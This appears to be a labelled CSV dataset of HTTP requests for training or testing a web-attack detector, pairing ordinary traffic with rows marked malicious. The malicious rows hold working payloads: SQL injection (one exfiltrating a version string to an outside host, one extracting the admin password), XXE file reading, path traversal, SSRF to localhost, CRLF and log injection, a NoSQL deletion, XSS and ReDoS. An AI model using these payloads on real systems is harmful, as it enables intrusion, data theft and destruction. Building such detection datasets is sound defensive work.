label,text
benign,"POST /user/logout HTTP/1.1
Host: cloud-desk-app.io
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Referer: https://cloud-desk-app.io/home
Cookie: sid=93cdab4827def7f321fae46283bcf7a1; prefs=theme%3Ddark
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
benign,"GET /images/animations/loading-spinner.gif HTTP/1.1
Host: api.snap-scrollers.org
Accept: image/gif,image/apng,image/*,*/*;q=0.8
Referer: https://api.snap-scrollers.org/docs/usage-guide
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /oauth2/token HTTP/1.1
Host: keygen-user-network.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Authorization: Basic a2V5YXBwOjFsNVNtTXk1RHROZkc1dQ==
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/plain, */*
Connection: keep-alive

grant_type=authorization_code&code=dXNlcjFfYXV0aF9jb2RlMTIz&redirect_uri=https%3A%2F%2Fkeygen-user-network.net%2Fauth%2Fcallback&client_id=keyapp&client_secret=Lt4fTmHf5u"
benign,"GET /api/v1/games?genre=strategy&limit=25&offset=50 HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NzY1MzQxMywiZXhwIjoxNzM4Mjg4ODAwfQ.CVu10qz_CnbGZkusxRSfOjlSx7_BKaHZDXuipN6vX_g
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Connection: close"
benign,"PATCH /accounts/9301847/profile HTTP/1.1
Host: finance-client-portal.eu
Authorization: Bearer YxtL8QvZbGysj7PXNwmCJeOuRkD352Vf93h
Content-Type: application/json-patch+json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Language: en-US
Connection: keep-alive

[
  {""op"": ""add"", ""path"": ""/notifications/email"", ""value"": false},
  {""op"": ""replace"", ""path"": ""/preferences/currency"", ""value"": ""EUR""}
]"
benign,"GET /docs/manuals/photography_basics_guide.pdf HTTP/1.1
Host: creative-mind-studio.net
Accept: application/pdf
Referer: https://creative-mind-studio.net/docs/manuals/
User-Agent: curl/7.88.1
Accept-Language: en-US,en;q=0.6
Connection: close"
benign,"GET /resources/icons/favicon-v3-192.png HTTP/1.1
Host: my-personal-blog-site.info
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://my-personal-blog-site.info/blog/2024/06/travel-tips
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: keep-alive"
malicious,"GET /community/forum/thread/337 HTTP/1.1
Host: community.game-dev-forum.org
X-Forwarded-For: 10.0.0.5%0d%0aX-Malicious:InjectedHeaderValue
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cache-Control: no-cache"
benign,"GET /videos/featured/weekly-top HTTP/1.1
Host: streaming-entertainment-hub.tv
If-Modified-Since: Tue, 30 Nov 2021 08:45:00 GMT
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9"
malicious,"GET /inventory/56' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/stats HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Referer: https://community.game-dev-forum.org/forums/games
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
benign,"POST /api/v4/comments/reply HTTP/1.1
Host: sports-newsdesk.live
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Referer: https://sports-newsdesk.live/article/football-championship
Content-Length: 88
Connection: keep-alive

{""commentId"":54321,""replyText"":""Thanks for the detailed analysis! Looking forward to next season.""}"
benign,"GET /user/profile/settings?cmd=view_details&user_id=35572 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://secure-user-portal.net/dashboard
DNT: 1"
malicious,"POST /newsletter/signup HTTP/1.1
Host: alerts.news-updater.tv
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html
Accept-Language: en-US
Content-Length: 56

email=user%40alerts.news-updater.tv%0auid%0apwd"
malicious,"POST /api/v2/admin/feature-toggle HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://secure-user-portal.net/admin/feature-flags
Content-Type: application/json
Content-Length: 31

{""featureX"":true,""betaUser"":false}"
malicious,"GET /app/dashboard/settings HTTP/1.1
Host: portal.finsecure-services.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
X-Debug-Options: <iframe src=""data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgiWFNTIGF0dGFjayIpPC9zY3JpcHQ+PC9odG1sPg==""></iframe>
Cache-Control: no-cache"
malicious,"POST /upload/processDocument HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=----Boundary123456
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/user/upload
Cookie: user_session=7sdf89asdxaoicnsdxoIWE8w72;
Connection: keep-alive

------Boundary123456
Content-Disposition: form-data; name=""description""

Upload for XML import
------Boundary123456
Content-Disposition: form-data; name=""xmlFile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------Boundary123456--"
malicious,"GET /api/v3/items?action=view&item_id=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.inventory-system.ai%255C%255Cdatafeed%2527%2529%2529%2529--%2520 HTTP/1.1
Host: inventory-system.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_token=93847faddb1c3a4f9a9224673449e93f; preferred_theme=dark
X-Requested-With: XMLHttpRequest"
benign,"POST /products/electronics/import HTTP/1.1
Host: retailtech-inventory.store
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Content-Type: text/csv
Content-Length: 118
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Cookie: sessionid=2f14b00eca506a96a9f2c513d578a1cb
Connection: keep-alive

sku,name,model,price,quantity
ET1001,Smart TV,32XHD4K,499.99,25
ET1002,Wireless Headphones,WH3000NC,259.00,40
ET1003,Smartphone,OpusZ10,799.95,30"
malicious,"POST /feedback/submit HTTP/1.1
Host: express-delivery-service.org
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept: */*
Origin: https://express-delivery-service.org

comments=Great%20service!'});db.orders.deleteMany({}); //&rating=5"
benign,"DELETE /accounts/50789/sessions/332 HTTP/1.1
Host: identity-cloud-service.io
Authorization: Bearer eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUgRG9lIg
X-Confirm-Delete: true
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br"
benign,"DELETE /profiles/5921 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
If-Match: ""d25f1c2e""
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: close"
benign,"GET /static/v2/js/chart.min.js HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: application/javascript, text/javascript, */*
Referer: https://online-retail-store.biz/products/electronics/tv/details
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9"
malicious,"GET /products/view?id=589 HTTP/1.1
Host: elitefitnessgear.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: user_id=789; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)#
Referer: https://elitefitnessgear.info/home"
malicious,"GET /event/register?email=user@example.com%0d%0aSet-Cookie:%20eventPass=gold HTTP/1.1
Host: tickets.booking-zone.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://tickets.booking-zone.org/events
Connection: keep-alive"
benign,"GET /search?q=wireless+earbuds&sort=price_asc HTTP/1.1
Host: gadget-exchange.net:8000
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://gadget-exchange.net/home
Connection: keep-alive"
benign,"GET /orders/history?id=7852 HTTP/1.1
Host: trusted-payment-gateway.co
Connection: keep-alive
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Cookie: authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"POST /forum/thread/305/post_reply HTTP/1.1
Host: coder-space.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Connection: keep-alive
Cache-Control: no-cache
Referer: https://coder-space.io/forum/thread/305
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
User-Agent: curl/7.82.0

author_name=dev_user82&comment_text=Thanks+for+the+code+example%2C+it+was+very+helpful+in+understanding+the+concepts.&csrf_token=8920bc12a20f44548bf98ea54ee2ab09"
benign,"GET /docs/tutorials/web-security/best-practices.pdf HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/113.0.1774.57
Accept: application/pdf
Range: bytes=0-1023
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate"
malicious,"GET /fetch?resource_url=http://localhost:5000/api/v1/secret/data HTTP/1.1
Host: securecontent-delivery.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /images/..%2F..%2F..%2F..%2Fboot.ini HTTP/1.1
Host: web-analytics-suite.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Accept-Encoding: gzip, deflate"
benign,"POST /photos/multi-upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----BoundaryXYZ1234
Content-Length: 987

------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art1.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art2.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------BoundaryXYZ1234--"
benign,"POST /feedback/submit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Accept: text/html,application/xhtml+xml
Connection: close

feedback_type=feature_request&details=add_dark_mode_toggle_button"
malicious,"POST /api/metadata/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 351
Origin: https://dashboard.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""session_update"",
  ""updateField"": ""location"",
  ""location"": ""us-west-2"",
  ""userId"": ""user_934857"",
  ""authToken"": ""NTFjMWQ2YzQtZTg2OS00ZDQyLWJiMWItMzNkNjY4YTAxOThl""
}"
benign,"GET /find/search?search_term=how+to+train+for+a+marathon HTTP/1.1
Host: healthy-living-advice.biz
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html
Referer: https://healthy-living-advice.biz/fitness
Connection: keep-alive
Pragma: no-cache"
benign,"GET /api/v3/analytics/metrics?start_date=2024-05-01&end_date=2024-05-21&source=mobile HTTP/1.1
Host: dataviz-cloud.ai
Accept: application/json
X-API-Key: 3f9c2a1987b5d4124e98be6ca6f1a2e7
User-Agent: curl/7.85.0
Accept-Encoding: deflate
Connection: close"
benign,"POST /dashboard/user/notification/read HTTP/1.1
Host: data-analytics-portal.cloud
Authorization: Bearer eyJraWQiOiJjNjMiLCJhbGciOiJFUzI1NiJ9.VFYgNqb.O1kJYlI2rhqU
Content-Type: application/json
Accept: application/json
Origin: https://data-analytics-portal.cloud
X-Requested-With: FetchAPIClient
X-CSRF-Token: 7e1faabc90d64b39bf4a
Cache-Control: no-store
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

{""notificationId"": ""ntf_44567"", ""status"": ""read""}"
malicious,"GET /static/js/..%2E%2E%2F..%2E%2E%2Fconfig.yaml HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*;q=0.01
Accept-Language: en-US,en;q=0.8
Referer: https://secure-user-portal.net/app/settings
Cache-Control: no-cache
Accept-Encoding: gzip, deflate"
benign,"GET /soap/orderStatus?orderId=1938 HTTP/1.1
Host: logistics-tracking.systems.net
Accept: application/xml
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Authorization: Bearer 4ef982hdj20bdkf82jd9f"
benign,"GET /category/books/science-fiction HTTP/1.1
Host: papertrail-reads.online
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml
Referer: https://papertrail-reads.online/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Cookie: sid=24a13b3ff7b8df403fd1afa7a1e38d66; cartid=b5e4f6274d0030cd
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
benign,"GET /css/main-responsive.css HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://my-personal-blog-site.info/blog/article/view/123
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"POST /services/feedback HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.jwt.string
X-CSRF-Token: f9dj203ksd9fj82jfjdrw9s
X-Requested-With: FetchAPIClient
Origin: https://dashboard.cloud-data-services.ai
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.31.0
Content-Length: 76

{""serviceId"":104,""rating"":4,""comments"":""Interface is intuitive but can be faster.""}"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0%0d%0aInjected-Header:%20InjectedValue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/dashboard
Connection: keep-alive"
malicious,"POST /login HTTP/1.1
Host: user-access.secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/login
Connection: close

username=alice%0d%0a127.0.0.1%20-%20admin%20%5B10/Oct/2023:13:55:36%20-0700%5D%20%22POST%20/admin/login%20HTTP/1.1%22%20200%20789&password=verysecret123"
benign,"GET / HTTP/1.1
Host: urban-chronicle.online
Accept: text/html
Accept-Language: en-US,en;q=0.9
Referer: https://google.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Connection: keep-alive"
benign,"POST /api/v1/user/preferences HTTP/1.1
Host: user-hub.management-service.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/json
Content-Length: 30
Accept: application/json
Connection: keep-alive
X-CSRF-Token: 4a8b2c3d9e7f

{""UNION ALL"": ""dark_mode_enabled""}"
benign,"POST /ws/shipment/status HTTP/1.1
Host: courier-express.co.uk
Content-Type: application/soap+xml; charset=UTF-8
Content-Length: 244
Connection: keep-alive
Accept: application/soap+xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Accept-Language: en-GB,en;q=0.9
If-None-Match: ""e2fc714c4727ee9395f324cd2e7f331f""

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
  <soap:Body>
    <CheckShipmentStatusRequest xmlns=""http://courier-express.co.uk/shipments"">
      <TrackingNumber>CX928374658GB</TrackingNumber>
      <RequestDate>2024-06-18T08:32:00Z</RequestDate>
    </CheckShipmentStatusRequest>
  </soap:Body>
</soap:Envelope>"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fcommunity.game-dev-forum.org%2Fthreads%2Fupdates HTTP/1.1
Host: fetcher.community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.124 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /docs/openapi.json HTTP/1.1
Host: cloud-backup-vault.net
Accept: application/json
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"POST /feedback/form HTTP/1.1
Host: urban-fashion-marketplace.store
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.147 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Referer: https://urban-fashion-marketplace.store/feedback
Origin: https://urban-fashion-marketplace.store
Cookie: ufm_user=39a8bc1252e9f7b2034d8a85e6d09317
Connection: keep-alive

name=Connor+Thompson&email=connor.thompson%40stylemail.co&subject=Product+Suggestion&message=Would+love+to+see+more+sustainable+clothing+options+added+to+your+collection."
benign,"POST /forum/thread/45/post_reply HTTP/1.1
Host: chatty-devs-network.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Accept-Language: en-US,en;q=0.9
Referer: https://chatty-devs-network.net/forum/thread/45
Origin: https://chatty-devs-network.net
Cookie: auth_token=7d2948c4b512d82209d5e51385f3b6e2; csrftoken=3ac813e9
Connection: keep-alive

comment_text=Thanks+for+the+insights%2C+I+found+the+section+on+APIs+very+helpful.&author_name=Melanie&csrfmiddlewaretoken=3ac813e9"
benign,"GET /events/weekly HTTP/1.1
Host: city-community-portal.org
Accept: text/html,application/xhtml+xml
Referer: https://city-community-portal.org/home
Connection: keep-alive
X-Forwarded-For: 10.1.2.33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"
benign,"HEAD /downloads/game-installer.exe HTTP/1.1
Host: gaming-downloads-portal.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /community/forums/announcements/latest HTTP/1.1
Host: indie-dev-hub.org
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Connection: keep-alive
Referer: https://indie-dev-hub.org/forums
X-CSRF-Token: 73e92b922f0aa534f3b3a05847d56c5e"
benign,"POST /api/v2/account/settings HTTP/1.1
Host: enterprise-data-solutions.io
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Type: application/xml
Accept: application/xml
Content-Length: 94
Connection: keep-alive
Cache-Control: no-store
Pragma: no-cache

<settings>
  <userId>82379</userId>
  <notifications>enabled</notifications>
  <theme>dark</theme>
</settings>"
benign,"POST /register HTTP/1.1
Host: world-food-explorers.net
Content-Type: application/json
Accept: application/json
Origin: https://world-food-explorers.net
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.85.0
Content-Length: 140
Connection: close

{""username"":""foodie_jane"",""password"":""Taste123!"",""email"":""jane.foodlover@food-explorers.net"",""interests"":[""Italian"",""Mexican"",""Japanese""],""subscribeNewsletter"":false}"
benign,"HEAD /index.html HTTP/1.1
Host: docs.enterprise-cloud-solutions.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
X-Forwarded-For: 203.0.113.45"
malicious,"POST /v2/input/check HTTP/1.1
Host: api.pattern-guard.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.9
Referer: https://dashboard.pattern-guard.ai/app/
Origin: https://dashboard.pattern-guard.ai
Cache-Control: max-age=0
Pragma: no-cache
X-Requested-With: XMLHttpRequest
Sec-CH-UA: ""Chromium"";v=""90"", "" Not A;Brand"";v=""99"", ""Google Chrome"";v=""90""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Content-Length: 188

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"PUT /api/user/avatar HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 72
X-Requested-With: XMLHttpRequest
Connection: keep-alive

{""avatarSource"": ""http://127.000.000.001:8080/api/status/check?verbose=true""}"
benign,"GET /user/settings/notifications HTTP/1.1
Host: friendhub-network.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Referer: https://friendhub-network.com/dashboard
Cookie: uid=usr_837492; loggedin=yes; sess_token=fd90823d9f8d2a3f4e6a10a0b81aef3c
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
